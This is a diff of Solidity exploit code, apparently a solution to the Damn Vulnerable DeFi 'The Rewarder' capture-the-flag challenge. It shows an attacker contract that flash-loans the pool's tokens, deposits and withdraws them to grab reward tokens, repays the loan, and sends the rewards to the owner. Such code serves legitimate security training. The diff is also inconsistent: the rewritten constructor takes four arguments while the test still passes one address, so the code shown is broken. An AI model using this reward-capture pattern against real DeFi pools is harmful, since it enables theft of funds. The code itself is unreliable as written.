@@ -14,29 +14,38 @@ import {FlashLoanerPool} from "../../../Contracts/the-rewarder/FlashLoanerPool.s
 
 contract AttackerContract {
     address public owner;
-    FlashLoanerPool public flashLoanerPool;
-    uint256 internal constant TOTAL_AMOUNT_TO_FLASHLOAN = 1_000_000e18 - 1;
+    uint256 public constant TOTAL_AMOUNT_TO_FLASHLOAN = 1_000_000e18 - 1;
+
     DamnValuableToken internal dvt;
+    FlashLoanerPool public flashLoanerPool;
     RewardToken internal rewardToken;
     TheRewarderPool internal theRewarderPool;
 
-    constructor(address pool) {
+    constructor(
+        DamnValuableToken _dvt,
+        FlashLoanerPool _flashLoanerPool,
+        TheRewarderPool _theRewarderPool,
+        RewardToken _rewardToken
+    ) {
         owner = msg.sender;
-        flashLoanerPool = FlashLoanerPool(pool);
+        dvt = _dvt;
+        flashLoanerPool = _flashLoanerPool;
+        theRewarderPool = _theRewarderPool;
+        rewardToken = _rewardToken;
     }
 
     function attack() public {
         require(msg.sender == owner, "Not Owner");
         flashLoanerPool.flashLoan(TOTAL_AMOUNT_TO_FLASHLOAN);
-        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
     }
 
-    function receiveFlashLoan(TOTAL_AMOUNT_TO_FLASHLOAN, uint256) public {
-        require(msg.sender == flashLoanerPool, "Not Pool");
-        dvt.approve(theRewarderPool, TOTAL_AMOUNT_TO_FLASHLOAN);
-        theRewarderPool.deposit(TOTAL_AMOUNT_TO_FLASHLOAN);
-        theRewarderPool.withdraw(TOTAL_AMOUNT_TO_FLASHLOAN);
-        dvt.tansfer(flashLoanerPool, TOTAL_AMOUNT_TO_FLASHLOAN);
+    function receiveFlashLoan(uint256 amountFlashLoaned) public {
+        require(msg.sender == address(flashLoanerPool), "Not Pool");
+        dvt.approve(address(theRewarderPool), amountFlashLoaned);
+        theRewarderPool.deposit(amountFlashLoaned);
+        theRewarderPool.withdraw(amountFlashLoaned);
+        dvt.transfer(address(flashLoanerPool), amountFlashLoaned);
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
     }
 }
 
@@ -123,7 +132,7 @@ contract TheRewarder is DSTest {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
         AttackerContract attackerContract = new AttackerContract(
-            flashLoanerPool
+            address(flashLoanerPool)
         );
         attackerContract.attack();
 
